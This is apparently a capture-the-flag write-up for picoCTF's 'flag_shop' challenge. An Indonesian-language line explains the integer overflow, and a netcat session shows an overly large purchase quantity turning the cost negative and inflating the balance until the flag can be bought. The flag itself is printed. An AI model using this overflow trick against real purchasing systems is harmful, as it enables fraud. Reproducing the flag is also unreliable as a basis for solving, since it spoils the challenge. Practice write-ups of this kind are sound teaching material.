<h1>flag_shop</h1>
<h3>Description</h3>
<pre>
There's a flag shop selling stuff, can you buy a flag?
<a href='https://challenge-files.picoctf.net/c_fickle_tempest/00517bd6f4d62bae3c15297f6bf9305fc49253f0638e1c52580a02a1c8cbd8a7/store.c'>Source</a>. Connect with nc fickle-tempest.picoctf.net 64576.
</pre>
<h3>Solution</h3>
<label>variabel account balance bisa terjadi integer overflow, kita cari nilai dari variabel total cost minus(negative)</label>

```console
┌──(root㉿Kali)-[/home/venom/Downloads]
└─# nc fickle-tempest.picoctf.net 64576
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1
These knockoff Flags cost 900 each, enter desired quantity
1000000000

The final cost is: -1943132160

Your current balance after transaction: 1943133260

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1943133260 


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1
YOUR FLAG IS: picoCTF{m0n3y_bag5_44cFf530}

Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection

```
<h3>Flag</h3>
<pre>
picoCTF{m0n3y_bag5_44cFf530}
</pre>


